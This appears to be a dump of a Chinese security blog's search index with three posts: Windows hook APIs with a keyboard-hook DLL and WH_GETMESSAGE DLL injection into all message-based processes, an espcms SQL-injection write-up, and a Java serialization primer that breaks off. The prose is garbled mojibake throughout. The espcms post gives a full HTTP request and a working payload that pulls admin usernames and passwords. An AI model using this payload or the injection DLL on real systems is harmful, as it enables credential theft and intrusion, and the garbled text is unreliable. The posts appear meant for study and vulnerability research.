æ¥å†³å®šæ‰§è¡Œä»€ä¹ˆåŠ¨ä½œã€‚è¯¥å€¼å–å†³äºé’©å­çš„ç±»å‹ï¼Œæ¯ç§ç±»å‹éƒ½æ‹¥æœ‰è‡ªå·±ç‰¹æœ‰çš„é’©å­ä»£ç é›†åˆã€‚ å‚æ•°wParamå’ŒlParamçš„å€¼ï¼Œéƒ½å–å†³äºé’©å­ä»£ç ã€‚ä½†æ˜¯ä¸€èˆ¬éƒ½åŒ…å«å‘é€æˆ–è€…ä¼ é€’çš„æ¶ˆæ¯çš„ä¿¡æ¯ã€‚ SetWindowsHookExè¿”å›ä¸€ä¸ªé’©å­å¥æŸ„ 123456HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, _In_ HOOKPROC lpfn,//å›è°ƒå‡½æ•°ï¼Œåç§°ä»»æ„ï¼Œå‚æ•°å’Œè¿”å›å€¼æ•°æ®å›ºå®š _In_ HINSTANCE hMod,//ä¸ºDllMainç¬¬ä¸€ä¸ªå‚æ•°g_Inst=(HMODULE)hModule; _In_ DWORD dwThreadId//å…¨å±€é’©å­è®¾ç½®0); lpfnï¼šæŒ‡å®šHOOKå‡½æ•°çš„åœ°å€ã€‚å¦‚æœdwThreadå‚æ•°è¢«è®¾ç½®ä¸º0æˆ–è€…è¢«è®¾ç½®ä¸ºä¸€ä¸ªè¿›ç¨‹ä¸­çš„çº¿ç¨‹IDï¼Œåˆ™è¯¥å›è°ƒHOOKå‡½æ•°åªèƒ½åœ¨DLLæ–‡ä»¶ä¸­ã€‚å¦‚æœdwThreadä¸ºå½“å‰è¿›ç¨‹ä¸­çš„çº¿ç¨‹IDï¼Œåˆ™è¿™ä¸ªå›è°ƒå‡½æ•°å¯ä»¥åœ¨å½“å‰è¿›ç¨‹ä¸­ä¹Ÿå¯ä»¥åœ¨DLLä¸­ã€‚ hModï¼šé’©å­å‡½æ•°æ‰€åœ¨æ¨¡å—çš„å¥æŸ„ã€‚lpfnæ‰€åœ¨çš„æ¨¡å—çš„å¥æŸ„ï¼Œå¦‚æœdwThreadIdä¸ºå½“å‰è¿›ç¨‹ä¸­çš„çº¿ç¨‹IDï¼Œè€Œä¸”lpfnæ‰€æŒ‡å‘çš„å‡½æ•°åœ¨å½“å‰è¿›ç¨‹ä¸­ï¼Œé‚£ä¹ˆhModè¢«è®¾ç½®ä¸ºNULL dwThreadIdï¼šéœ€è¦è¢«æŒ‚é’©çš„çº¿ç¨‹IDå·ï¼ˆæŒ‡å®šçš„è¯ä¸ºå±€éƒ¨é’©å­ï¼‰ï¼Œå¦‚æœè®¾ç½®ä¸º0è¡¨ç¤ºåœ¨åŸºäºæ¶ˆæ¯æœºåˆ¶çš„æ‰€æœ‰çš„çº¿ç¨‹æŒ‚é’©ï¼ˆå…¨å±€é’©å­ï¼‰ï¼Œå¦‚æœæŒ‡å®šä¸ºå…·ä½“IDå¥½ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¦åœ¨æŒ‡å®šçš„çº¿ç¨‹ä¸­è¿›è¡ŒæŒ‚é’©ã€‚è¿™ä¸ªå‚æ•°å½±å“ä¸Šè¾¹ä¸¤ä¸ªå‚æ•°çš„å–å€¼ï¼Œå†³å®šäº†è¯¥é’©å­å±äºå…¨å±€é’©å­è¿˜æ˜¯å±€éƒ¨é’©å­ã€‚ idHook:é’©å­çš„ç±»å‹ UnhookWindowsExç§»é™¤å…ˆå‰ç”¨SetWindowsHookExå®‰è£…çš„é’©å­ï¼Œ 123BOOL UnhookWindowsHookEx( HHOOK hhk //é’©å­å¥æŸ„); å¯ä»¥å¤šæ¬¡åå¤å®‰è£…é’©å­ï¼Œè€Œä¸”å¯ä»¥å®‰è£…å¤šä¸ªåŒæ ·ç±»å‹çš„é’©å­ã€‚è¿™æ ·ä¼šå½¢æˆä¸€æ¡é’©å­é“¾ï¼Œæœ€åå®‰è£…çš„é’©å­ä¼šé¦–å…ˆæˆªè·åˆ°æ¶ˆæ¯ï¼Œå½“è¯¥é’©å­å¯¹æ¶ˆæ¯å¤„ç†å®Œæ¯•ä»¥åä¼šé€‰æ‹©è¿”å›ï¼Œæˆ–è€…ç»§ç»­ä¼ é€’æ¶ˆæ¯ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸ºäº†æ¶ˆæ¯å¯ä»¥ä¼ è¾¾åˆ°ç›®æ ‡çª—å£ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©å°†æ¶ˆæ¯ç»§ç»­ä¼ é€’ CallNextHookExä½¿æ¶ˆæ¯ç»§ç»­ä¼ é€’ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºé’©å­å¥æŸ„ï¼Œåé¢ä¸‰ä¸ªä¸ºé’©å­å‡½æ•°çš„å‚æ•° 123456LRESULT CallNextHookEx( HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam); GetKeyNameTextGetKeyNameTextå‡½æ•°æ£€ç´¢è¡¨ç¤ºé”®çš„åç§°çš„å­—ç¬¦ä¸²ã€‚ 12345int GetKeyNameTextA( LONG lParam,//é’©å­å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°lparam LPSTR lpString,//æ¥æ”¶çš„ç¼“å†²åŒº int cchSize//æœ€å¤§å¤§å°); é”®ç›˜é’©å­å®ä¾‹åŠŸèƒ½ä¸ºç”¨Messageboxæ˜¾ç¤ºæŒ‰ä¸‹é”®çš„å­—ç¬¦ã€‚æ—¢ç„¶è¦æˆªè·é”®ç›˜æ¶ˆæ¯ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯æˆªè·ç³»ç»ŸèŒƒå›´å†…çš„é”®ç›˜æ¶ˆæ¯ï¼Œå› æ­¤éœ€è¦å®‰è£…å…¨å±€é’©å­ï¼Œè¿™æ ·å°±éœ€è¦DLLæ–‡ä»¶æ”¯æŒã€‚ é¦–å…ˆæ–°å»ºDLLæ–‡ä»¶ï¼Œå®šä¹‰ä¸¤ä¸ªå¯¼å‡ºå‡½æ•°å’Œä¸¤ä¸ªå…¨å±€å˜é‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;pch.h&quot;#include &lt;Windows.h&gt;//å®šä¹‰å¯¼å‡ºå‡½æ•°ï¼Œå¼€å§‹hookå’Œç»“æŸhookextern &quot;C&quot; __declspec(dllexport) void SetHookOn();extern &quot;C&quot; __declspec(dllexport) void SetHookOff();HHOOK g_Hook = NULL;HINSTANCE g_Inst = NULL;//é‡å†™é’©å­å‡½æ•°//CallNextHookExå‡½æ•°è¡¨ç¤ºå°†å½“å‰é’©å­ä¼ é€’ç»™é’©å­é“¾ä¸­çš„ä¸‹ä¸€ä¸ªé’©å­//ç¬¬ä¸€ä¸ªå‚æ•°å½“å‰é’©å­çš„å¥æŸ„ã€‚å¦‚æœç›´æ¥è¿”å›0ï¼Œåˆ™è¡¨ç¤ºä¸­æ–­é’©å­ä¼ é€’//å¯¹é’©å­è¿›è¡Œæ‹¦æˆªLRESULT CALLBACK KeyboardProc( int code, WPARAM wParam, LPARAM lParam){//è¿›å…¥é’©å­å‡½æ•°çš„ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœcode&lt;0å¿…é¡»è°ƒç”¨CallNextHookExå°†æ¶ˆæ¯ç»§ç»­ä¼ é€’ä¸‹å»ï¼Œä¸å¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œå¹¶è¿”å›CallNextHookExçš„è¿”å›å€¼ï¼ŒMSDNè¦æ±‚ã€‚ if (code &lt; 0) { return CallNextHookEx(g_Hook, code, wParam, lParam); }//å¦‚æœcodeç­‰äºHC_ACTIONï¼Œè¡¨ç¤ºæ¶ˆæ¯ä¸­å«æœ‰æŒ‰é”®æ¶ˆæ¯ï¼Œå¦‚æœä¸ºWM_KEYDOWNæ˜¾ç¤ºæŒ‰é”®å¯¹åº”æ–‡æœ¬ if (code == HC_ACTION &amp;&amp; lParam &gt; 0) { TCHAR szBuf[MAXBYTE] = { 0 }; GetKeyNameText(lParam, szBuf, MAXBYTE); MessageBox(NULL, szBuf, NULL, MB_OK); } return CallNextHookEx(g_Hook, code, wParam, lParam);}void SetHookOn(){ g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, 0);}void SetHookOff(){ UnhookWindowsHookEx(g_Hook);}BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ g_Inst = (HMODULE)hModule; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} åœ¨DllMainå‡½æ•°ä¸­ï¼Œéœ€è¦ä¿å­˜è¯¥DLLæ¨¡å—çš„å¥æŸ„ï¼Œä»¥æ–¹ä¾¿å®‰è£…å…¨å±€é’©å­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// MFCKeyboardHookDlg.cpp: å®ç°æ–‡ä»¶//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;MFCKeyboardHook.h&quot;#include &quot;MFCKeyboardHookDlg.h&quot;#include &quot;afxdialogex.h&quot;#pragma comment(lib,&quot;KeyboardHook&quot;) extern &quot;C&quot; void SetHookOn();extern &quot;C&quot; void SetHookOff();#ifdef _DEBUG#define new DEBUG_NEW#endif// CMFCKeyboardHookDlg å¯¹è¯æ¡†CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent /*=nullptr*/) : CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent){ m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);}void CMFCKeyboardHookDlg::DoDataExchange(CDataExchange* pDX){ CDialog::DoDataExchange(pDX);}BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog) ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2) ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)END_MESSAGE_MAP()// CMFCKeyboardHookDlg æ¶ˆæ¯å¤„ç†ç¨‹åºBOOL CMFCKeyboardHookDlg::OnInitDialog(){ CDialog::OnInitDialog(); // è®¾ç½®æ­¤å¯¹è¯æ¡†çš„å›¾æ ‡ã€‚ å½“åº”ç”¨ç¨‹åºä¸»çª—å£ä¸æ˜¯å¯¹è¯æ¡†æ—¶ï¼Œæ¡†æ¶å°†è‡ªåŠ¨ // æ‰§è¡Œæ­¤æ“ä½œ SetIcon(m_hIcon, TRUE); // è®¾ç½®å¤§å›¾æ ‡ SetIcon(m_hIcon, FALSE); // è®¾ç½®å°å›¾æ ‡ // TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç  return TRUE; // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE}// å¦‚æœå‘å¯¹è¯æ¡†æ·»åŠ æœ€å°åŒ–æŒ‰é’®ï¼Œåˆ™éœ€è¦ä¸‹é¢çš„ä»£ç // æ¥ç»˜åˆ¶è¯¥å›¾æ ‡ã€‚ å¯¹äºä½¿ç”¨æ–‡æ¡£/è§†å›¾æ¨¡å‹çš„ MFC åº”ç”¨ç¨‹åºï¼Œ// è¿™å°†ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆã€‚void CMFCKeyboardHookDlg::OnPaint(){ if (IsIconic()) { CPaintDC dc(this); // ç”¨äºç»˜åˆ¶çš„è®¾å¤‡ä¸Šä¸‹æ–‡ SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // ä½¿å›¾æ ‡åœ¨å·¥ä½œåŒºçŸ©å½¢ä¸­å±…ä¸­ int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // ç»˜åˆ¶å›¾æ ‡ dc.DrawIcon(x, y, m_hIcon); } else { CDialog::OnPaint(); }}//å½“ç”¨æˆ·æ‹–åŠ¨æœ€å°åŒ–çª—å£æ—¶ç³»ç»Ÿè°ƒç”¨æ­¤å‡½æ•°å–å¾—å…‰æ ‡//æ˜¾ç¤ºã€‚HCURSOR CMFCKeyboardHookDlg::OnQueryDragIcon(){ return static_cast&lt;HCURSOR&gt;(m_hIcon);}void CMFCKeyboardHookDlg::OnBnClickedButton2(){ // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  SetHookOn();}void CMFCKeyboardHookDlg::OnBnClickedButton1(){ // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  SetHookOff();} å…¨å±€é’©å­DLLæ³¨å…¥WH_GETMESSAGEï¼šè¯¥é’©å­ä½œç”¨æ˜¯ç›‘è§†è¢«æŠ•é€’åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆæ¯ã€‚ä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨GetMessage()æˆ–PeekMessage()å‡½æ•°æ—¶ï¼Œå‡½æ•°ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è·å–ä¸€ä¸ªæ¶ˆæ¯åè°ƒç”¨è¯¥é’©å­ã€‚ åˆ©ç”¨WH_GETMESSAGEå¯ä»¥å°†DLLæ–‡ä»¶æ³¨å…¥åˆ°æ‰€æœ‰çš„åŸºäºæ¶ˆæ¯æœºåˆ¶çš„ç¨‹åºä¸­ï¼Œåœ¨éœ€è¦DLLå¤§èŒƒå›´æ³¨å…¥åˆ°åŸºäºæ¶ˆæ¯çš„è¿›ç¨‹ä¸­æ—¶å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;#pragma warning(disable:4996)#pragma data_seg(&quot;mydata&quot;)HHOOK g_Hook = NULL; //å¿…é¡»èµ‹åˆå€¼ï¼Œå¦åˆ™å¾®è½¯ç¼–è¯‘å™¨ä¼šæŠŠæ²¡æœ‰åˆå§‹åŒ–çš„æ•°æ®æ”¾åˆ°æ™®é€šçš„æœªåˆå§‹åŒ–æ•°æ®æ®µä¸­ //è€Œä¸æ˜¯æ”¾åœ¨sharedä¸­,ä»è€Œå¯¼è‡´å¤šä¸ªè¿›ç¨‹ä¹‹é—´çš„å…±äº«è¡Œä¸ºå¤±è´¥#pragma data_seg()#pragma comment(linker,&quot;/SECTION:mydata,RWS&quot;) extern &quot;C&quot; __declspec(dllexport) void SetHookOn();extern &quot;C&quot; __declspec(dllexport) void SetHookOff();HINSTANCE g_hInst;LRESULT CALLBACK GetMessageProc( int nCode, WPARAM wParam, LPARAM lParam){ MessageBox(NULL, L&quot;Hooked&quot;, L&quot;æç¤º&quot;, MB_ICONWARNING | MB_OKCANCEL); return CallNextHookEx(g_Hook, nCode, wParam, lParam);}void SetHookOn(){ g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, 0);}void SetHookOff(){ UnhookWindowsHookEx(g_Hook);}BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { g_hInst = hModule; } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;}","link":"/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/"},{"title":"","text":"espcmså‰å°æ³¨å…¥åˆ†æã€Šä»£ç å®¡è®¡ ä¼ä¸šçº§Webä»£ç å®‰å…¨æ¶æ„ã€‹ä¸€ä¹¦ä¸­å‡ºç°çš„cmsï¼Œ14å¹´çš„è€ç‰ˆæœ¬å‡ºç°çš„Insertå‹æ³¨å…¥ã€‚æ¼æ´ä½äºå‰å°æäº¤è®¢å•å¤„ /interface/order.php $ptitleå’Œ$tsnä¸ºå¯æ§å˜é‡ï¼Œé€šè¿‡acceptæ–¹æ³•è·å–å‚æ•° 12$ptitle = $this-&gt;fun-&gt;accept('ptitle', 'P');$tsn = $this-&gt;fun-&gt;accept('tsn', 'P'); /public/class_function.phpå¤„æ‰¾åˆ°acceptå‡½æ•°çš„å®šä¹‰ï¼Œä»$_GETå’Œ$_POSTæ•°ç»„ä¸­è·å–å†…å®¹ï¼Œå¹¶ä½¿ç”¨daddslasheså‡½æ•°è¿‡æ»¤ã€‚ æŸ¥çœ‹daddslasheså‡½æ•°å£°æ˜ï¼Œé¦–å…ˆåˆ¤æ–­gpcæ˜¯å¦å¼€å¯ï¼Œæœªå¼€å¯åˆ™å¼€å¯gpcï¼Œå½“$stringä¸ºæ•°ç»„æˆ–ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè°ƒç”¨addslasheså¯¹å‡½æ•°è¿›è¡Œè¿‡æ»¤å¹¶è¿”å›è¿‡æ»¤åçš„$string ç¬¬373è¡Œæ‹¼æ¥å¹¶æ‰§è¡Œäº†sqlè¯­å¥ï¼Œå¯æ§å˜é‡$tsnå’Œ$ptitleæœªç»è¿‡ä»»ä½•è¿‡æ»¤å°±æ‹¼æ¥åˆ°äº†sqlè¯­å¥ä¸­,è¿™ä¸ª $tsn å’Œ $did $ptitle éƒ½æ˜¯å¯æ§çš„å˜é‡,ç›¸å½“äº $_POST[XXX] ï¼Œ$tsn ä¸ä¸ºæ•°ç»„æ—¶å–å€¼å°±ä¼šå˜æˆ $tsn{x}çš„æ–¹å¼ ï¼Œ$temp = â€œabcâ€$temp[0]çš„å€¼ä¸ºaã€‚$tsnå‚æ•°æäº¤ä¸€ä¸ªâ€™ï¼Œç»è¿‡daddslashesè½¬ä¹‰åè‡ªåŠ¨æ·»åŠ \\å˜æˆ\\â€˜ï¼Œå–$tsn[0]ä¸º,å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¾¾åˆ°ç»•è¿‡è½¬ä¹‰çš„é™åˆ¶ï¼Œæ¥è¾¾åˆ°æ³¨å…¥çš„ç›®çš„ã€‚ æ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå¯ä»¥çœ‹åˆ°é»˜è®¤ä¼ é€’$ptitle[]å’Œ$tsn[]ï¼Œ%5B%5Dä¸ºurlç¼–ç åçš„[] 123456789101112131415POST /espcms/index.php?ac=order&amp;at=ordersave HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 541Origin: http://localhostConnection: closeReferer: http://localhost/espcms/index.php?ac=order&amp;at=orderpayCookie: cookieconsent_status=dismiss; Phpstorm-8e4b56ac=beb94186-86bf-4a9d-832a-863045cf4b2f; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1609381035; bdshare_firstime=1609381035017; Kffm_2132_saltkey=BgX15Dcg; Kffm_2132_lastvisit=1609472159; LankeMobile=p; ecisp_home_seccode=VneCeoRkPaRoYm1deaqUnow; ecisp_member_username=qtXCmg; ecisp_member_info=Z-LdZrRltZqompSolXLIpZqioo-c1J7eamZkZp2RbGxnbLVnZ2ZlaGKXbGxsspOclmObnm1nnJ6YaJtpb3Bnl2ZtYZTFb56abcJryJLGtJZkaJ2Wm51ka5yXmGhslGKRcJ9ybJObmpSWmW2TbseZ; PHPSESSID=fdcbb78c3f2f1dbfa3f269460137e63b; ecisp_order_list=l6CScLOnc2xvWJ5naFScmXNrcNysn2ScWpmamoicn3JmcHSocGlvU5POp66nqoN0zmuTc7Ku; ecisp_order_productmoney=aZiRZg; ecisp_order_sncode=aZ7CbZlpb25lm2lnamjDaXFpmZlxy2eXcWdlbpzHmJ4Upgrade-Insecure-Requests: 1userid=1&amp;productmoney=3200&amp;discount_productmoney=3200&amp;discountmoney=0&amp;tokenkey=85e30790ab01309cf9ba7c2cc40f03f8&amp;ptitle%5B%5D=HTC+Flyer+%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91&amp;tsn%5B%5D=SN20110830222536894&amp;bprice%5B%5D=3200.00&amp;oprice%5B%5D=3600.00&amp;did%5B%5D=27&amp;amount%5B%5D=1&amp;countprice%5B%5D=3200.00&amp;alias=rrr&amp;sex=0&amp;email=asdasd%40gmail.com&amp;tel=eeee&amp;mobile=eeee&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=eee&amp;zipcode=0&amp;sendtime=1&amp;osid=1&amp;opid=1&amp;content=&amp;invpayee=&amp;invcontent=&amp;submit=%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%AE%A2%E5%8D%95 æ­£å¸¸æäº¤æ‰§è¡Œçš„sqlè¯­å¥ 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,26,'','HTC S510e',3200,3100,3100,1,1) $tsnå»æ‰[]åæäº¤ \\ $ptitle[]æäº¤ ,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)# â€‹ $tsnä¸$ptitleå‡æœ‰å•å¼•å·åŒ…è£¹ï¼Œæ‹¼æ¥åˆ°sqlè¯­å¥ä¸­$tsnä¸$ptitleé»˜è®¤è¢«å½“ä½œæ•°ç»„å¤„ç†ï¼Œå½“$tsnä¸ºå­—ç¬¦ä¸²æ—¶,å°è¯•æäº¤$tsnå†…å®¹ä¸ºâ€˜ï¼Œç»è¿‡acceptå‡½æ•°å¤„ç†ï¼Œdaddslasheså‡½æ•°è½¬ä¹‰å$tsnä¸º\\â€˜å¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼ŒåŸæœ¬åŒ…è£¹$tsnçš„åä¸€ä¸ªå¼•å·è¢«è½¬ä¹‰ï¼Œ$tsnçš„å‰ä¸€ä¸ªå¼•å·ä¸$ptitleçš„å‰ä¸€ä¸ªå¼•å·é—­åˆï¼Œç›¸å½“äº$tsnå®é™…å†…å®¹ä¸ºâ€™\\â€˜,â€™ â€‹ æ³¨å…¥æ‰§è¡Œçš„sqlè¯­å¥å¦‚ä¸‹ 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,36,'\\',',(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#',3200,3100,3100,1,1) åœ¨æäº¤è®¢å•æ—¶å€™ç”¨burpsuiteæŠ“åŒ…å¹¶ä¿®æ”¹ åˆ©ç”¨æˆåŠŸ å‚è€ƒï¼š https://www.uedbox.com/post/25828/ https://www.seebug.org/vuldb/ssvid-94423","link":"/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"},{"title":"javaååºåˆ—åŒ–å­¦ä¹ ","text":"SerializeableSeializeableæ˜¯javaå®ç°åºåˆ—åŒ–æœºåˆ¶çš„å·¥å…·ï¼Œåºåˆ—åŒ–æ•°æ®åŒ…å«å¯¹è±¡ç±»å‹å’Œå±æ€§å€¼ã€‚ Serializeableå·¥å…·çš„ç®€å•è¯´æ˜ 1234åªéœ€è¦å®ç°Serializeableæ¥å£å°±å¯ä»¥è¿›è¡Œå¯¹è±¡çš„åºåˆ—åŒ–å¤„ç†åºåˆ—åŒ–å¯¹è±¡å¯ä»¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ã€é›†åˆç±»æˆ–å…¶ä»–å¯¹è±¡ä½¿ç”¨transientã€staticå…³é”®å­—ä¿®é¥°çš„å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–çˆ¶ç±»ä¸å¯åºåˆ—åŒ–æ—¶ï¼Œéœ€è¦çˆ¶ç±»ä¸­å­˜åœ¨æ— å‚æ„é€ å‡½æ•°ã€‚ ç›¸å…³æ¥å£å’Œç±» 123456java.io.Serializablejava.io.Externalizable //è¯¥æ¥å£éœ€è¦å®ç°writeExternalå’ŒreadExternalå‡½æ•°æ§åˆ¶åºåˆ—åŒ–ObjectOutputObjectInputObjectOutputStreamObjectInputStream åºåˆ—åŒ– 123456789//åˆ›å»ºOutputStreamå¯¹è±¡OutputStream outputStream= new FileOutputStream(&quot;serial&quot;);//å°†å…¶å°è£…åˆ°ObjectOutputStreamå¯¹è±¡ä¸­ObjectOutputStream objectOutputStream=new ObjectOutputStream((outputStream));//æ­¤åè°ƒç”¨writeObject()å¯¹å®¢å®Œæˆå¯¹è±¡çš„åºåˆ—åŒ–ï¼Œå¹¶å°†å…¶å‘é€ç»™OutputStreamobjectOutputStream.writeObject(Object);//å…³é—­èµ„æºobjectOutputStream.close();outputStream.close(); ååºåˆ—åŒ– 123456789//åˆ›å»ºOutputStreamå¯¹è±¡InputStream inputStream=new FileInputStream(&quot;serial&quot;);//å°†å…¶å°è£…åˆ°ObjectInputStreamå¯¹è±¡ä¸­ObjectInputStream objectInputStream=new ObjectInputStream((inputStream));//åªéœ€è°ƒç”¨readObject(0å³å¯å®Œæˆå¯¹è±¡çš„ååºåˆ—åŒ–objectInputStream.readObject();//å…³é—­èµ„æºobjectInputStream.close();inputStream.close(); Serializableæ¥å£ä¸€èˆ¬ä¸€ä¸ªç±»åªè¦ç»§æ‰¿äº†Serializableæ¥å£ï¼Œå°±ä»£è¡¨è¯¥ç±»å’Œå…¶å­ç±»éƒ½èƒ½è¿›è¡ŒJDKçš„åºåˆ—åŒ– 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.tq;import java.io.*;public class MyJavaSerialize { public static class UInfo implements Serializable{ private String userName; private int userAge; private String userAddress; public String getUserName(){return userName;}; public int getUserAge(){return userAge;}; public String getUserAddress(){return userAddress;}; public void setUserName(String userName){this.userName=userName;}; public void setUserAge(int userAge){this.userAge=userAge;}; public void setUserAddress(String userAddress){this.userAddress=userAddress;}; } public static void main(String[] args) throws Exception { UInfo userInfo=new UInfo(); userInfo.setUserAddress(&quot;a&quot;); userInfo.setUserAge(22); userInfo.setUserName(&quot;admin&quot;); OutputStream outputStream=new FileOutputStream(&quot;serial&quot;); ObjectOutputStream objectOutputStream=new ObjectOutputStream(outputStream); objectOutputStream.writeObject(userInfo); objectOutputStream.close(); outputStream.close(); InputStream inputStream=new FileInputStream(&quot;serial&quot;); ObjectInputStream objectInputStream=new ObjectInputStream(inputStream); UInfo unserialUInfo=(UInfo) objectInputStream.readObject(); objectInputStream.close(); inputStream.close(); System.out.println(unserialUInfo.userName); System.out.println(unserialUInfo.userAge); System.out.println(unserialUInfo.userAddress); }} è¾“å‡ºç»“æœï¼Œå·¥ç¨‹ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ªserialæ–‡ä»¶ï¼Œå…¶å†…å®¹å°±æ˜¯åºåˆ—åŒ–åçš„æ•°æ® Externalizableæ¥å£é™¤äº†Serializableæ¥å£ï¼Œjavaè¿˜æä¾›äº†å¦ä¸€ä¸ªåºåˆ—åŒ–æ¥å£Externalizableï¼Œè¯¥æ¥å£ç»§æ‰¿è‡ªSerializableæ¥å£ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªæŠ½è±¡å‡½æ•°ï¼šwriteExternalå’ŒreadExternalã€‚éœ€è¦è‡ªè¡Œå®ç°ä¸¤ä¸ªå‡½æ•°æ¥æ§åˆ¶åºåˆ—åŒ–æµç¨‹ï¼Œå¦åˆ™ç›®æ ‡åºåˆ—åŒ–ç±»å±æ€§å€¼ä¼šæ˜¯ç±»åˆå§‹åŒ–åçš„é»˜è®¤å€¼ã€‚ åœ¨ä½¿ç”¨Externalizableæ¥å£å®ç°åºåˆ—åŒ–æ—¶ï¼Œè¯»å–å¯¹è±¡ä¼šè°ƒç”¨ç›®æ ‡åºåˆ—åŒ–ç±»çš„æ— å‚æ„é€ å‡½æ•°å»åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå†æŠŠå¾ç£Šè¯æ•°æ®ä¸­çš„ç±»å±æ€§å€¼åˆ†åˆ«å¡«å……åˆ°æ–°å¯¹è±¡ä¸­ã€‚æ‰€ä»¥å®ç°Externalizableæ¥å£çš„ç±»å¿…é¡»æä¾›ä¸€ä¸ªpublicå±æ€§çš„æ— å‚æ„é€ å‡½æ•° serialVersionUIDç›®æ ‡åºåˆ—åŒ–ç±»æœ‰ä¸€ä¸ªéšè—å±æ€§ 1private static final long serialVerionUID 